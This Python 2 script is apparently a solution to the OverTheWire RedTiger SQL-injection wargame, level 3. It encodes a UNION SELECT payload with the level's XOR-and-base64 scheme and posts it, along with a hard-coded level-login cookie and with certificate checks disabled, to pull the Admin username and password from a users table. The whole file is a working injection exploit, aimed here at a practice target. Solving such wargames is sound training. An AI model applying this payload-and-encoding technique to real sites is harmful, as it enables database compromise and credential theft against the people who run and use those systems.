#!/usr/bin/python2

import requests
import base64

requests.packages.urllib3.disable_warnings()

def encrypt(_str):
    cryptedstr = ""
    for i in range(len(_str)):
        temp = ord(_str[i:i+1]) ^ 192
        temp = str(temp)
        while len(temp)<3:
            temp = "0" + temp
        cryptedstr += temp
        
    return base64.b64encode(cryptedstr)
    
url = "https://redtiger.labs.overthewire.org/level3.php"
cookies = {
    "level3login":"feed_the_cat_who_eats_your_bread"
}

params = {
    "usr": encrypt("' union select 1,2,3,username,password,6,7 from level3_users where username='Admin")
}

r = requests.post(url, cookies=cookies, params=params, verify=False)
print r.content
